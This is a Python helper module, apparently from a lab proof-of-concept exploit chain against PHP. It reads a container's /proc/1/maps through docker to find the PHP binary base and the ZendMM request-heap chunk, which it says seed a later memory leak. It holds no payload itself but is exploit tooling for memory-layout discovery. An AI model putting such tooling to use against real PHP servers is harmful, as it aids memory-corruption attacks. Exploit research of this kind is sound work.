#!/usr/bin/env python3
# INDEX: seed binbase and heap chunk from /proc maps | cli | lab-only, needs docker exec
"""proc_maps_bootstrap.py - lab /proc/1/maps bootstrap (reads the PHP SAPI
binary base and the request-heap chunk out of the container's own maps).

Seeds round 1 before the leak derives the rest. Lab-only: runs `docker compose
exec` to read /proc/1/maps. Stdlib only.
"""
from __future__ import annotations

import os
import subprocess
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import curl  # noqa: E402


def bootstrap_proc_maps(service, base):
    """The two region facts /proc/1/maps gives away: the php SAPI binary base
    (/usr/local/bin/php, or /usr/local/sbin/php-fpm whose master shares the
    workers' mapping) and the request-heap chunk, seeding round 1 before the
    leak derives the rest (fn, zsys, per-boot confirmation of chunk/binbase).
    One warm-up request first so the chunk exists."""
    curl([f"{base}/index.php"], 15, service=service)
    r = subprocess.run(["docker", "compose", "exec", "-T", service,
                        "cat", "/proc/1/maps"], capture_output=True)
    if r.returncode != 0:
        raise SystemExit(f"[chain] cannot read /proc/1/maps in {service}: "
                         f"{r.stderr.decode()[:200]}")
    binbase, chunks = None, []
    for line in r.stdout.decode("utf-8", "replace").splitlines():
        parts = line.split(None, 5)
        if len(parts) < 5 or "-" not in parts[0]:
            continue
        rng, perms, off, _dev, _inode = parts[:5]
        path = parts[5].strip() if len(parts) > 5 else ""
        try:
            start, end = (int(x, 16) for x in rng.split("-"))
        except ValueError:
            continue
        # the php SAPI binary: /usr/local/bin/php (php -S / cli) or
        # /usr/local/sbin/php-fpm (the fpm master and its forked workers
        # share this mapping, so the base is valid for the worker too).
        if (path.endswith("/php") or path.endswith("/php-fpm")) and binbase is None:
            binbase = start
        # the ZendMM request-heap chunk: a 2 MiB mapping. /proc/maps may
        # merge it with an adjacent anonymous page into one VMA (then the
        # VMA end is 2 MiB-aligned and its size is >= one chunk), so take
        # chunk = end - 2 MiB; a clean chunk is also 2 MiB-aligned at its
        # start. Fresh worker: exactly one candidate (the OOM producer mmaps
        # more chunks later - bootstrap before any round runs).
        if path == "" and perms == "rw-p" and off == "00000000":
            if end % 0x200000 == 0 and end - start >= 0x200000:
                chunks.append(end - 0x200000)
    return binbase, sorted(set(chunks))
